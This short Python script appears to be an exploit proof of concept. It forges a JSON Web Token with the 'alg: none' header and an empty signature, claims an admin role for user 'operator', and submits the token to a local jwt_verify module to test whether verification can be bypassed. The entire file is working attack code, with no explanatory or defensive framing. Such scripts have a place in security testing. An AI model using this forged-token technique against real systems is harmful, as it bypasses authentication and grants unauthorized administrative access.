import base64
import json
import jwt_verify

h = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip("=")
p = base64.urlsafe_b64encode(json.dumps({"user":"operator","role":"admin"}).encode()).decode().rstrip("=")
token = f"{h}.{p}."
print("Forged Token:", token)
print(jwt_verify.verify_token(token))
